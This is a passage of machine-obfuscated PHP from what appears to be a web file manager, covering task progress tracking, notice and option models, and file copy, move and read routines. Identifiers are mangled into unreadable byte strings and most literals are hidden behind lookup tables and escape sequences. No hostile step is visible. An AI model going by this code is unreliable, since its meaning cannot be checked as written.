$_SERVER[ßğøİ]; $šÕù§Ú =& $this->task; $šÕù§Ú[$ÕÌÙşú[1704]] = $İûõÁİ‘; $šÕù§Ú[$ÕÌÙşú[1706]] = $ùóŠ×“ş; $šÕù§Ú[$ÕÌÙşú[1710]] += $ùóŠ×“ş; $šÕù§Ú[$ÕÌÙşú[1711]] = $šÕù§Ú[$ÕÌÙşú[1710]]; $this->update(1); self::log($ÕÌÙşú[1725] . $İûõÁİ‘); } public function sourceModelCopy($©³‰çÒ) { $ğê¨ˆø =& $_SERVER[ßğøİ]; $·À““œ™ = $©³‰çÒ[0]; $Ï…Ë–“ = $©³‰çÒ[1]; $³¹ö’Ã³ =& $this->task; $this->sourceModelCopyFlag = !0; $‚˜Ì…¬š = 0; switch ($·À““œ™) { case $ğê¨ˆø[572]: $‚˜Ì…¬š = 1; break; case $ğê¨ˆø[575]: $³¹ö’Ã³[$ğê¨ˆø[1704]] = $Ï…Ë–“[$ğê¨ˆø[32]]; break; case $ğê¨ˆø[577]: $‚˜Ì…¬š = intval($©³‰çÒ[$ğê¨ˆø[380]] * 0.4); break; case $ğê¨ˆø[579]: $‚˜Ì…¬š = intval($©³‰çÒ[$ğê¨ˆø[380]] * 0.2); break; case $ğê¨ˆø[581]: $‚˜Ì…¬š = intval($©³‰çÒ[$ğê¨ˆø[380]] * 0.4); break; } $this->update($‚˜Ì…¬š); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ëÂè›ò, $ıÃê°çâ) { $‚Èª‹° =& $_SERVER[ßğøİ]; $this->sourceModelCopyFlag = !0; $áÀ¶Ú‹ø = 1; if (isset($ëÂè›ò[$‚Èª‹°[79]])) { $áÀ¶Ú‹ø = $ëÂè›ò[$‚Èª‹°[79]][$‚Èª‹°[77]]; $áÀ¶Ú‹ø = $áÀ¶Ú‹ø + $ëÂè›ò[$‚Èª‹°[79]][$‚Èª‹°[78]] + 1; } $this->update($áÀ¶Ú‹ø); $this->sourceModelCopyFlag = !1; } public function sourceMove($òÈ°©¨¨) { $this->sourceRemove($òÈ°©¨¨, !1); } public function curlProgress($äÀÃšì, $î©óëº, $¯Ã áæ€, $ªŸÉÇ¯Ø, $ùÒæº¥Õ) { $À™§´êÓ =& $_SERVER[ßğøİ]; $ŒÑ‚²“  =& $this->task; if ($ùÒæº¥Õ > 0) { $ŒÑ‚²“ [$À™§´êÓ[1064]] = $À™§´êÓ[1726]; $ŒÑ‚²“ [$À™§´êÓ[1708]] = $À™§´êÓ[107]; if ($ŒÑ‚²“ [$À™§´êÓ[1706]]) { $ŒÑ‚²“ [$À™§´êÓ[1707]] = $ùÒæº¥Õ; } if ($ŒÑ‚²“ [$À™§´êÓ[1709]]) { $ŒÑ‚²“ [$À™§´êÓ[1707]] = $ùÒæº¥Õ + $ŒÑ‚²“ [$À™§´êÓ[1709]]; } } else { if ($¯Ã áæ€ > 0) { if ($ŒÑ‚²“ [$À™§´êÓ[1706]] == $î©óëº) { $ŒÑ‚²“ [$À™§´êÓ[1707]] = $¯Ã áæ€; $ŒÑ‚²“ [$À™§´êÓ[1064]] = $À™§´êÓ[1727]; $ŒÑ‚²“ [$À™§´êÓ[1708]] = $À™§´êÓ[1199]; } } } $this->update(); } public function curlProgressStart($™ªŒ¼Ú) { } public function curlProgressEnd($–±çÛü¨) { $™¢ôÄ×ï =& $_SERVER[ßğøİ]; $–½âã =& $this->task; $÷†ÔÑ» = curl_getinfo($–±çÛü¨); $âïÌæò = $÷†ÔÑ»[$™¢ôÄ×ï[1728]]; if ($âïÌæò == -1) { $âïÌæò = $÷†ÔÑ»[$™¢ôÄ×ï[1729]]; } if ($–½âã[$™¢ôÄ×ï[1708]] == $™¢ôÄ×ï[107] && $âïÌæò) { $–½âã[$™¢ôÄ×ï[1709]] += $âïÌæò; } $this->update(); } } goto d½ÃÆ±ˆ‘; D…¡æŒ•îğ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\x6e\x6f\x74\x69\x63\x65\x4c\x69\x73\164"; public $field = array("\156\141\x6d\145", "\143\x6f\156\164\x65\156\x74", "\141\x75\x74\x68", "\155\x6f\144\x65", "\x74\x69\155\145", "\164\171\x70\x65", "\154\145\166\145\154", "\x65\156\141\142\x6c\145", "\x73\157\x72\x74"); public function listData($“¶õï°í = false, $ë´Éè—› = "\163\157\x72\164", $è“²Ä‹ = false) { return parent::listData($“¶õï°í, $ë´Éè—›, $è“²Ä‹); } public function add($£„ÅŠÑÅ) { $«Ä¹ÈêÚ =& $_SERVER[ßğøİ]; $¼¤¡èÉ© = time(); if ($£„ÅŠÑÅ[$«Ä¹ÈêÚ[16]] == $«Ä¹ÈêÚ[2254]) { $¼¤¡èÉ© = strtotime($£„ÅŠÑÅ[$«Ä¹ÈêÚ[203]]); } $£„ÅŠÑÅ[$«Ä¹ÈêÚ[203]] = $¼¤¡èÉ©; return parent::insert($£„ÅŠÑÅ); } public function update($‘×ß¸Éé, $İÏÛ¨îä) { $õÇœ’•õ =& $_SERVER[ßğøİ]; $Şóå§ŒŠ = $this->listData($‘×ß¸Éé); if (!$Şóå§ŒŠ) { return !1; } $ëô° ß = time(); if ($İÏÛ¨îä[$õÇœ’•õ[16]] == $õÇœ’•õ[2254]) { $ëô° ß = strtotime($İÏÛ¨îä[$õÇœ’•õ[203]]); } $İÏÛ¨îä[$õÇœ’•õ[203]] = $ëô° ß; return parent::update($‘×ß¸Éé, $İÏÛ¨îä); } public function remove($åºşäò—) { $Ëîœ™øÏ = $this->listData($åºşäò—); if (!$Ëîœ™øÏ || $Ëîœ™øÏ[$_SERVER[ßğøİ][1276]]) { return !1; } return parent::remove($åºşäò—); } public function sort($ºòÇº ï, $óìÕƒéí) { return parent::update($ºòÇº ï, $óìÕƒéí); } public function enable($ü¬€¬×ú, $õˆ›Ô˜¿) { return parent::update($ü¬€¬×ú, array($_SERVER[ßğøİ][2255] => $õˆ›Ô˜¿)); } private function initUserOption() { $Î›®ÜÚŒ =& $_SERVER[ßğøİ]; $this->optionType = $Î›®ÜÚŒ[2256]; $this->modelType = $Î›®ÜÚŒ[2257]; $this->field = array($Î›®ÜÚŒ[2258], $Î›®ÜÚŒ[32], $Î›®ÜÚŒ[203], $Î›®ÜÚŒ[33], $Î›®ÜÚŒ[2259], $Î›®ÜÚŒ[747], $Î›®ÜÚŒ[195]); } public function userNoticeGet($ìÎ”²³ = false) { $this->initUserOption(); return parent::listData($ìÎ”²³, $_SERVER[ßğøİ][399], !0); } public function userNoticeAdd($í¼ñ­š) { $é¦°œç¶ =& $_SERVER[ßğøİ]; $this->initUserOption(); $–ÏÚ‰¢¸ = $this->findByKey($é¦°œç¶[2258], $í¼ñ­š[$é¦°œç¶[399]]); if ($–ÏÚ‰¢¸) { return !0; } $Ş¾¦Ü÷’ = array($é¦°œç¶[2258] => $í¼ñ­š[$é¦°œç¶[399]], $é¦°œç¶[32] => $í¼ñ­š[$é¦°œç¶[32]], $é¦°œç¶[203] => $í¼ñ­š[$é¦°œç¶[203]], $é¦°œç¶[33] => isset($í¼ñ­š[$é¦°œç¶[33]]) ? $í¼ñ­š[$é¦°œç¶[33]] : 1, $é¦°œç¶[2259] => isset($í¼ñ­š[$é¦°œç¶[2259]]) ? $í¼ñ­š[$é¦°œç¶[2259]] : 0, $é¦°œç¶[747] => 0, $é¦°œç¶[195] => 0); return parent::insert($Ş¾¦Ü÷’); } public function userNoticeEdit($õãÍ, $±‚êÏœ) { $this->initUserOption(); return parent::update($õãÍ, $±‚êÏœ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\x6d\137\157\x70\x74\151\157\156"; protected $jsonField = array("\x6d\x65\x6e\x75", "\162\x6f\154\x65", "\162\x6f\154\145\x47\x72\x6f\x75\x70", "\162\x65\147\151\163\164", "\x65\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($æ×†òøÏ) { return "\x53\171\x73\x74\145\x6d\117\160\164\x69\x6f\156\137{$æ×†òøÏ}"; } protected function optionDefault($Îİ©öœÓ = '') { $ÏşÆÇìµ =& $_SERVER[ßğøİ]; if ($Îİ©öœÓ == $ÏşÆÇìµ[12]) { return $GLOBALS[$ÏşÆÇìµ[6]][$ÏşÆÇìµ[381]]; } } } class SystemRecordModel extends ModelBaseLight { } goto f ùµÅáŒì; Eí»Ûß£ò’: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($°Œ÷ÓÂ, $Á¨ûö‚õ) { $ê‚„ùé– =& $_SERVER[ßğøİ]; $¡°¬•¿ = $Á¨ûö‚õ; $GLOBALS[$ê‚„ùé–[1146]] = $ê‚„ùé–[1147] . $°Œ÷ÓÂ; Hook::trigger($ê‚„ùé–[1147] . $°Œ÷ÓÂ . $ê‚„ùé–[1148], $¡°¬•¿); $Ñà®­ùÔ = self::driverMake($Á¨ûö‚õ[0]); if (!$Ñà®­ùÔ) { return !1; } if (method_exists($Ñà®­ùÔ, $°Œ÷ÓÂ)) { $ÚéÅÀÉ = @call_user_func_array(array($Ñà®­ùÔ, $°Œ÷ÓÂ), $Á¨ûö‚õ); } else { if (method_exists($Ñà®­ùÔ, $ê‚„ùé–[1149])) { $ÚéÅÀÉ = @call_user_func_array(array($Ñà®­ùÔ, $°Œ÷ÓÂ), $Á¨ûö‚õ); } else { if (method_exists(self, $°Œ÷ÓÂ)) { $ÚéÅÀÉ = @call_user_func_array(array(self, $°Œ÷ÓÂ), $Á¨ûö‚õ); } else { $ÚéÅÀÉ = call_user_func_array(array(parent, $°Œ÷ÓÂ), $Á¨ûö‚õ); } } } Hook::trigger($ê‚„ùé–[1147] . $°Œ÷ÓÂ . $ê‚„ùé–[1150], $¡°¬•¿, $ÚéÅÀÉ); return $ÚéÅÀÉ; } public static function init($öÔ·È›à) { return self::driverMake($öÔ·È›à); } public static function copy($Ó½ë­Æ„, $ğ¥“•Ë‘, $ âİì¾“ = false, $¥ãé²Ğş = false) { return self::copyMoveStart($Ó½ë­Æ„, $ğ¥“•Ë‘, $ âİì¾“, $_SERVER[ßğøİ][555], $¥ãé²Ğş); } public static function move($ÄøÈñÑ, $õ±¼Ø, $×Ø–áº = false, $©Ø°‹ô = false) { return self::copyMoveStart($ÄøÈñÑ, $õ±¼Ø, $×Ø–áº, $_SERVER[ßğøİ][557], $©Ø°‹ô); } private static function copyMoveStart($‚Ú¹ÊëË, $°¼€¤³—, $°˜É¬ğ, $èéé±¨ï, $­ÎÀ€Ô“) { $¦£ä×ã¦ =& $_SERVER[ßğøİ]; $±¯øÃ“¼ = array($‚Ú¹ÊëË, $°¼€¤³—, $°˜É¬ğ, $­ÎÀ€Ô“); Hook::trigger($¦£ä×ã¦[1147] . $èéé±¨ï . $¦£ä×ã¦[1148], $±¯øÃ“¼); $ø³Ê£ìà = self::copyMove($‚Ú¹ÊëË, $°¼€¤³—, $°˜É¬ğ, $èéé±¨ï, $­ÎÀ€Ô“); Hook::trigger($¦£ä×ã¦[1147] . $èéé±¨ï . $¦£ä×ã¦[1150], $±¯øÃ“¼, $ø³Ê£ìà); return $ø³Ê£ìà; } public static function saveFile($­±”ˆÅù, $‰Ëèøš‡, $Ø‘Í’‰Ü = true) { $Ÿ÷×˜³€ =& $_SERVER[ßğøİ]; $ßŸÀå“ = self::info($‰Ëèøš‡); $Üçè©ñ¿ = self::driverMake($­±”ˆÅù); $™¤ş÷ûÃ = self::driverMake($‰Ëèøš‡); $Ê‹ãû¾ï = !1; if ($™¤ş÷ûÃ->pathParse[$Ÿ÷×˜³€[1151]]) { $Ê‹ãû¾ï = $™¤ş÷ûÃ; $©°©ÓÚË = $™¤ş÷ûÃ->pathParse[$Ÿ÷×˜³€[1151]]; $™¤ş÷ûÃ = self::driverMake($©°©ÓÚË); } if ($Üçè©ñ¿->pathParse[$Ÿ÷×˜³€[1151]]) { $âØÃ™Ì¹ = $Üçè©ñ¿->pathParse[$Ÿ÷×˜³€[1151]]; $Üçè©ñ¿ = self::driverMake($âØÃ™Ì¹); } $ááÂøı = $™¤ş÷ûÃ->pathFather($‰Ëèøš‡); $ŸĞ¾Î¶À = !0; if (!$Ø‘Í’‰Ü && self::driverIsSame($Üçè©ñ¿, $™¤ş÷ûÃ)) { $ŸĞ¾Î¶À = !1; } $Â¸Ò·İÚ = self::copyFile($Üçè©ñ¿, $­±”ˆÅù, $™¤ş÷ûÃ, $ááÂøı, $ßŸÀå“[$Ÿ÷×˜³€[32]], $ŸĞ¾Î¶À); if ($Ê‹ãû¾ï) { $Â¸Ò·İÚ = $Ê‹ãû¾ï->getPathOuter($Â¸Ò·İÚ); } return $Â¸Ò·İÚ; } private static function copyMove($±ÈÔäœù, $¨‰Ùü¼©, $ıÅüÄæá, $Ï°î©ğí, $ôİ•°Ç = false) { $•ÏãÒÉ¾ =& $_SERVER[ßğøİ]; if (!$±ÈÔäœù || $±ÈÔäœù == $•ÏãÒÉ¾[8] || !$¨‰Ùü¼©) { return !1; } ignore_timeout(); $¿í‡Çñ¬ = self::driverMake($±ÈÔäœù); $ï¦ÚÌ®ğ = self::driverMake($¨‰Ùü¼©); $ÀÃÌµˆ± = $Ï°î©ğí == $•ÏãÒÉ¾[557]; $ô—¿œ¶õ = !1; if ($ï¦ÚÌ®ğ->pathParse[$•ÏãÒÉ¾[1151]]) { $ô—¿œ¶õ = $ï¦ÚÌ®ğ; $¨‰Ùü¼© = $ï¦ÚÌ®ğ->pathParse[$•ÏãÒÉ¾[1151]]; $ï¦ÚÌ®ğ = self::driverMake($¨‰Ùü¼©); } if ($¿í‡Çñ¬->pathParse[$•ÏãÒÉ¾[1151]]) { $±ÈÔäœù = $¿í‡Çñ¬->pathParse[$•ÏãÒÉ¾[1151]]; $¿í‡Çñ¬ = self::driverMake($±ÈÔäœù); } self::check($¿í‡Çñ¬, $±ÈÔäœù, $ï¦ÚÌ®ğ, $¨‰Ùü¼©); Hook::trigger($•ÏãÒÉ¾[1152], $¿í‡Çñ¬, $±ÈÔäœù, $ï¦ÚÌ®ğ, $¨‰Ùü¼©); $ù¡Ú˜—™ = self::driverIsSame($¿í‡Çñ¬, $ï¦ÚÌ®ğ); if ($ù¡Ú˜—™) { if ($Ï°î©ğí == $•ÏãÒÉ¾[557] && !method_exists($ï¦ÚÌ®ğ, $•ÏãÒÉ¾[1153]) && trim($¨‰Ùü¼©, $•ÏãÒÉ¾[8]) == trim($ï¦ÚÌ®ğ->pathFather($±ÈÔäœù), $•ÏãÒÉ¾[8])) { if ($¿í‡Çñ¬->pathThis($±ÈÔäœù) != $ôİ•°Ç && !$¿í‡Çñ¬->isTypeObject()) { return $¿í‡Çñ¬->rename($±ÈÔäœù, $ôİ•°Ç); } return $ï¦ÚÌ®ğ->getPathOuter($±ÈÔäœù); } if (method_exists($ï¦ÚÌ®ğ, $Ï°î©ğí)) { return $ï¦ÚÌ®ğ->{$Ï°î©ğí}($±ÈÔäœù, $¨‰Ùü¼©, $ıÅüÄæá, $ôİ•°Ç); } } if ($ù¡Ú˜—™ && $Ï°î©ğí == $•ÏãÒÉ¾[557] && $ï¦ÚÌ®ğ->getType() == $•ÏãÒÉ¾[106]) { $ê·ÀÂÏë = $ï¦ÚÌ®ğ->movePath($±ÈÔäœù, $¨‰Ùü¼©, $ôİ•°Ç); if ($ê·ÀÂÏë) { return $ê·ÀÂÏë; } } $¨Á¢µ = $¿í‡Çñ¬->isFile($±ÈÔäœù); if (!$¨Á¢µ && $ï¦ÚÌ®ğ->getType() == $•ÏãÒÉ¾[755] && $¿í‡Çñ¬->getType() == $•ÏãÒÉ¾[106]) { $ê·ÀÂÏë = $ï¦ÚÌ®ğ->copyFolderFromIO($¿í‡Çñ¬, $±ÈÔäœù, $¨‰Ùü¼©, $ıÅüÄæá, $ÀÃÌµˆ±, $ôİ•°Ç); } else { $ê·ÀÂÏë = self::copyPath($¿í‡Çñ¬, $±ÈÔäœù, $ï¦ÚÌ®ğ, $¨‰Ùü¼©, $ıÅüÄæá, $ÀÃÌµˆ±, $¨Á¢µ, $ôİ•°Ç); } if ($ê·ÀÂÏë && $ÀÃÌµˆ±) { $¿í‡Çñ¬->remove($±ÈÔäœù); } if ($ô—¿œ¶õ) { $ê·ÀÂÏë = $ô—¿œ¶õ->getPathOuter($ê·ÀÂÏë); } return $ê·ÀÂÏë; } private static function check($şâü¥Ğ›, $û¢©ºıæ, $‚ßÀå¿—, &$«÷Š¨®) { $¦µµ„· =& $_SERVER[ßğøİ]; if (self::driverIsSame($şâü¥Ğ›, $‚ßÀå¿—) && $şâü¥Ğ›->isFolder($û¢©ºıæ) && $şâü¥Ğ›->isParentOf($û¢©ºıæ, $«÷Š¨®)) { show_json(LNG($¦µµ„·[1154]), !1); } if (!$şâü¥Ğ›->exist($û¢©ºıæ)) { show_json(LNG($¦µµ„·[105]), !1); } } private static function copyPath($ş“áòçÒ, $¯—Èî„, $³„İ¤–Š, $±ğÌ©¶ä, $Û”¡Õü², $†Ç‡ÎÍ–, $¦Á«·ÑÆ, $ªìÂÍÍ‹ = false, $Ò£ƒ—ôØ = true) { $ôÂİÊı­ =& $_SERVER[ßğøİ]; $ÑÈˆ¾Ÿ = empty($ªìÂÍÍ‹) && $ªìÂÍÍ‹ !== $ôÂİÊı­[197] ? $ş“áòçÒ->pathThis($¯—Èî„) : $ªìÂÍÍ‹; if ($Û”¡Õü²) { $¥Í›ëÀÊ = $³„İ¤–Š->fileNameExist($±ğÌ©¶ä, $ÑÈˆ¾Ÿ); $ÅÅç—É = $ÑÈˆ¾Ÿ; $ÑÈˆ¾Ÿ = $³„İ¤–Š->fileNameAuto($±ğÌ©¶ä, $ÑÈˆ¾Ÿ, $Û”¡Õü², !$¦Á«·ÑÆ); if (!$¥Í›ëÀÊ || $ÅÅç—É != $ÑÈˆ¾Ÿ) { $Û”¡Õü² = !1; } if ($Ò£ƒ—ôØ && !$Û”¡Õü²) { $³„İ¤–Š->_data[$ôÂİÊı­[1155]] = !0; } } if ($¦Á«·ÑÆ) { return self::copyFile($ş“áòçÒ, $¯—Èî„, $³„İ¤–Š, $±ğÌ©¶ä, $ÑÈˆ¾Ÿ, $†Ç‡ÎÍ–); } if ($Û”¡Õü² == REPEAT_RENAME_FOLDER) { $Û”¡Õü² = !1; } $ˆ£Ğâçã = rtrim($±ğÌ©¶ä, $ôÂİÊı­[8]) . $ôÂİÊı­[8] . $ÑÈˆ¾Ÿ; $ğ¢¤Ù§„ = $³„İ¤–Š->mkdir($³„İ¤–Š->getPath($ˆ£Ğâçã), $Û”¡Õü²); $±ğÌ©¶ä = $³„İ¤–Š->getPathInner($ğ¢¤Ù§„); $ƒĞõ²¸ = $ş“áòçÒ->listPath($¯—Èî„, !0); $ƒĞõ²¸ = is_array($ƒĞõ²¸) ? $ƒĞõ²¸ : array($ôÂİÊı­[83] => array(), $ôÂİÊı­[82] => array()); $ÈìóÂ× = array_merge($ƒĞõ²¸[$ôÂİÊı­[83]], $ƒĞõ²¸[$ôÂİÊı­[82]]); foreach ($ÈìóÂ× as $Úù¸…©) { $üşÀ¡öœ = $Úù¸…©[$ôÂİÊı­[33]] == $ôÂİÊı­[199]; $¯—Èî„ = $ş“áòçÒ->getPathInner($Úù¸…©[$ôÂİÊı­[84]]); $™é§×¾Õ = self::copyPath($ş“áòçÒ, $¯—Èî„, $³„İ¤–Š, $±ğÌ©¶ä, $Û”¡Õü², $†Ç‡ÎÍ–, $üşÀ¡öœ, !1, !1); if (!$™é§×¾Õ) { IO::errorTips($ôÂİÊı­[1156] . $¯—Èî„ . $ôÂİÊı­[70] . $±ğÌ©¶ä); } } self::copyMoveKeepInfo($ş“áòçÒ, $¯—Èî„, $ğ¢¤Ù§„); return $ğ¢¤Ù§„; } private static function copyFile($Ğ ı’„, $Óë®²øş, $ÉÙÁ›¾, $ë‡‘ÜëÍ, $˜âı­íü, $Ëæ˜¯ô) { $‡«ÇÒ =& $_SERVER[ßğøİ]; $ë‡‘ÜëÍ = $ÉÙÁ›¾->getPath(rtrim($ë‡‘ÜëÍ, $‡«ÇÒ[8]) . $‡«ÇÒ[8] . $˜âı­íü); $ù“¡÷ı = $‡«ÇÒ[1157] . time() . rand_string(5); Hook::trigger($‡«ÇÒ[1158], $Ğ ı’„, $Óë®²øş, $ÉÙÁ›¾, $ë‡‘ÜëÍ, $˜âı­íü, $ù“¡÷ı); if (self::driverIsSame($Ğ ı’„, $ÉÙÁ›¾)) { if ($Ëæ˜¯ô) { $¢ëÚÂé¥ = $ÉÙÁ›¾->moveFile($Óë®²øş, $ë‡‘ÜëÍ); } else { $¢ëÚÂé¥ = $ÉÙÁ›¾->copyFile($Óë®²øş, $ë‡‘ÜëÍ); } Hook::trigger($‡«ÇÒ[1159], $Ğ ı’„, $Óë®²øş, $ÉÙÁ›¾, $ë‡‘ÜëÍ, $˜âı­íü, $¢ëÚÂé¥); self::copyMoveKeepInfo($Ğ ı’„, $Óë®²øş, $¢ëÚÂé¥); return $¢ëÚÂé¥; } $òÊô¥é = TEMP_FILES; if ($GLOBALS[$‡«ÇÒ[6]][$‡«ÇÒ[89]][$‡«ÇÒ[793]]) { $òÊô¥é = $GLOBALS[$‡«ÇÒ[6]][$‡«ÇÒ[89]][$‡«ÇÒ[793]]; } $•üüˆáó = $òÊô¥é; mk_dir($•üüˆáó); $ªÜœİÄ = $•üüˆáó . $ù“¡÷ı; $‘£¦Ùˆ© = $ªÜœİÄ; $ªÜœİÄ = $Ğ ı’„->download($Óë®²øş, $ªÜœİÄ); $ªÜœİÄ = $Ğ ı’„->iconvApp($ªÜœİÄ); if (substr($ªÜœİÄ, strlen($òÊô¥é)) == $òÊô¥é) { $Ëæ˜¯ô = !0; } $¢ëÚÂé¥ = $ÉÙÁ›¾->upload($ë‡‘ÜëÍ, $ªÜœİÄ, $Ëæ˜¯ô); self::remove($‘£¦Ùˆ©); Hook::trigger($‡«ÇÒ[1159], $Ğ ı’„, $Óë®²øş, $ÉÙÁ›¾, $ë‡‘ÜëÍ, $˜âı­íü, $¢ëÚÂé¥); self::copyMoveKeepInfo($Ğ ı’„, $Óë®²øş, $¢ëÚÂé¥); return $¢ëÚÂé¥; } private static function copyMoveKeepInfo($‹Î¬½Šé, $Ç¹ øÌ¦, $­—ˆÓ³) { if (!$­—ˆÓ³) { return; } $¶¤§Ù´ü = $‹Î¬½Šé->info($Ç¹ øÌ¦); if (!is_array($¶¤§Ù´ü)) { return; } IO::setModifyTime($­—ˆÓ³, $¶¤§Ù´ü[$_SERVER[ßğøİ][85]]); } public static function pathFather($õäĞ’Ğ­) { $×‰«î‚Î = IO::init($õäĞ’Ğ­); $ôÈ‰¤ËÆ = $×‰«î‚Î->pathFather($×‰«î‚Î->path); return $×‰«î‚Î->getPathOuter($ôÈ‰¤ËÆ); } public static function fileOut($Ğ²¢ó‰ì, $£¢—…›à = false, $¢Ãù¥æ = false, $âß¤ïÏÁ = '') { $åŞ¶¹ı½ = self::driverMake($Ğ²¢ó‰ì); if ($åŞ¶¹ı½->isFileOutServer()) { return $åŞ¶¹ı½->fileOutServer($Ğ²¢ó‰ì, $£¢—…›à, $¢Ãù¥æ, $âß¤ïÏÁ); } return $åŞ¶¹ı½->fileOut($Ğ²¢ó‰ì, $£¢—…›à, $¢Ãù¥æ, $âß¤ïÏÁ); } public static function fileOutImage($ŞèŠ­¤, $š£‚Øù¤ = 250) { $‡Ñ´¬ø = array(250, 600, 1200, 2000, 3000, 5000); for ($ö®°©ÈÙ = 0; $ö®°©ÈÙ < count($‡Ñ´¬ø); $ö®°©ÈÙ++) { if ($ö®°©ÈÙ == 0 && $š£‚Øù¤ <= $‡Ñ´¬ø[$ö®°©ÈÙ]) { $š£‚Øù¤ = $‡Ñ´¬ø[$ö®°©ÈÙ]; break; } else { if ($š£‚Øù¤ > $‡Ñ´¬ø[$ö®°©ÈÙ - 1] && $š£‚Øù¤ <= $‡Ñ´¬ø[$ö®°©ÈÙ]) { $š£‚Øù¤ = $‡Ñ´¬ø[$ö®°©ÈÙ]; break; } else { if ($ö®°©ÈÙ == count($‡Ñ´¬ø) - 1 && $š£‚Øù¤ > $‡Ñ´¬ø[$ö®°©ÈÙ]) { $š£‚Øù¤ = $‡Ñ´¬ø[$ö®°©ÈÙ]; break; } } } } $­å¥ë‘ = self::driverMake($ŞèŠ­¤); if ($­å¥ë‘->isFileOutServer()) { return $­å¥ë‘->fileOutImageServer($ŞèŠ­¤, $š£‚Øù¤); } return $­å¥ë‘->fileOutImage($ŞèŠ­¤, $š£‚Øù¤); } private static function driverIsSame($éØœ‚, $¥ÇÆ”ä) { $¹Ë™´½£ =& $_SERVER[ßğøİ]; $Â½ö•Ñ = $éØœ‚->getType(); $¯Ş˜¦º‚ = $¥ÇÆ”ä->getType(); if ($Â½ö•Ñ != $¯Ş˜¦º‚) { return !1; } if ($Â½ö•Ñ == $¹Ë™´½£[755]) { return !0; } if ($Â½ö•Ñ == $¹Ë™´½£[106]) { return !0; } if ($éØœ‚->pathDriver == $¥ÇÆ”ä->pathDriver) { return !0; } return !1; } public static function copyUpdate($Áè¾¼½ş, $®şıÌê˜) { $©öÁüø =& $_SERVER[ßğøİ]; if (!IO::exist($Áè¾¼½ş)) { return !1; } if (!IO::exist($®şıÌê˜)) { IO::mkdir($®şıÌê˜); } $Ìæöó†· = self::_listAll($Áè¾¼½ş); $³Şøğ†ò = self::_listAll($®şıÌê˜); $÷Ü¢‹ÄÂ = array(); $€¦ßÜ¯æ = array(); foreach ($Ìæöó†· as $Õ¡”Õá => $¼Â¿É–İ) { if (isset($³Şøğ†ò[$Õ¡”Õá])) { if ($¼Â¿É–İ[$©öÁüø[75]] == 1) { continue; } if ($³Şøğ†ò[$Õ¡”Õá][$©öÁüø[76]] == $¼Â¿É–İ[$©öÁüø[76]]) { continue; } } if ($¼Â¿É–İ[$©öÁüø[75]] == 1) { $€¦ßÜ¯æ[] = $®şıÌê˜ . $©öÁüø[8] . $Õ¡”Õá; continue; } $¯´‹œ·Æ = strstr(trim($Õ¡”Õá, $©öÁüø[8]), $©öÁüø[8]) ? get_path_father($Õ¡”Õá) : $©öÁüø[12]; $÷Ü¢‹ÄÂ[] = array($©öÁüø[1160] => $¼Â¿É–İ[$©öÁüø[84]], $©öÁüø[1161] => rtrim($®şıÌê˜, $©öÁüø[8]) . $©öÁüø[8] . $¯´‹œ·Æ, $©öÁüø[1162] => $¼Â¿É–İ); } $ôª¸ˆÎ = array($©öÁüø[199] => $÷Ü¢‹ÄÂ, $©öÁüø[75] => $€¦ßÜ¯æ); Hook::trigger($©öÁüø[1163], $Áè¾¼½ş, $®şıÌê˜, $ôª¸ˆÎ); foreach ($€¦ßÜ¯æ as $¼Â¿É–İ) { IO::mkdir($¼Â¿É–İ); } foreach ($÷Ü¢‹ÄÂ as $¼Â¿É–İ) { IO::copy($¼Â¿É–İ[$©öÁüø[1160]], $¼Â¿É–İ[$©öÁüø[1161]], REPEAT_REPLACE); } } private static function _listAll($©œÏ–ò) { $ÅŠ‰¾İù =& $_SERVER[ßğøİ]; $©œÏ–ò = KodIO::clear($©œÏ–ò); $üóİõàô = IO::listAll($©œÏ–ò); foreach ($üóİõàô as &$ªĞ¸ğÒ) { $¢Å¿ÕØ = substr($ªĞ¸ğÒ[$ÅŠ‰¾İù[84]], strlen($©œÏ–ò)); $ªĞ¸ğÒ[$ÅŠ‰¾İù[1164]] = trim($¢Å¿ÕØ, $ÅŠ‰¾İù[8]); } unset($ªĞ¸ğÒ); return array_to_keyvalue($üóİõàô, $ÅŠ‰¾İù[1164]); } public static function fileSubstr($´Éƒ×Şï, $÷€Ö€Ş‡, $·çâÉÁ = false) { $í—™· =& $_SERVER[ßğøİ]; $Ê”£¯ÈÒ = self::driverMake($´Éƒ×Şï); $û¿ÈÄ™ = $Ê”£¯ÈÒ->size($´Éƒ×Şï); $±ØÃ£ƒƒ = $÷€Ö€Ş‡; $ıÚ«ƒ = $·çâÉÁ; if ($÷€Ö€Ş‡ < 0) { $÷€Ö€Ş‡ = $û¿ÈÄ™ + $÷€Ö€Ş‡; } if ($·çâÉÁ === !1) { $·çâÉÁ = $û¿ÈÄ™ - $÷€Ö€Ş‡; } if ($÷€Ö€Ş‡ + $·çâÉÁ > $û¿ÈÄ™) { $·çâÉÁ = $û¿ÈÄ™ - $÷€Ö€Ş‡; } if (!$û¿ÈÄ™ && $Ê”£¯ÈÒ->getType() == $í—™·[106] && !$Ê”£¯ÈÒ->exist($´Éƒ×Şï)) { $¿¤™ÍÄ = get_path_this($´Éƒ×Şï); $¯“Ë³Ûê = parse_url_query($¿¤™ÍÄ); if (is_array($¯“Ë³Ûê) && isset($¯“Ë³Ûê[$í—™·[32]])) { $¿¤™ÍÄ = urldecode($¯“Ë³Ûê[$í—™·[32]]); } throw new Exception($í—™·[1165] . LNG($í—™·[1166]) . $í—™·[966] . clear_html($¿¤™ÍÄ) . $í—™·[12]); } if ($·çâÉÁ <= 0) { return $í—™·[12]; } if ($÷€Ö€Ş‡ < 0 || $÷€Ö€Ş‡ >= $û¿ÈÄ™ || $·çâÉÁ > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\x65\122\x65\x61\x64\40\x65\x72\x72\157\x72\41\40\163\164\141\x72\164\x3d{$÷€Ö€Ş‡}\73\154\145\156\x67\164\150\75{$·çâÉÁ}\73\x20\163\x69\172\145\75{$û¿ÈÄ™}\73"); } $ËÏª¥Ä = $Ê”£¯ÈÒ->fileSubstr($´Éƒ×Şï, $÷€Ö€Ş‡, $·çâÉÁ); if (!$ËÏª¥Ä && $·çâÉÁ && isset($GLOBALS[$í—™·[1167]])) { throw new Exception($GLOBALS[$í—™·[1167]][$í—™·[1168]]); } return 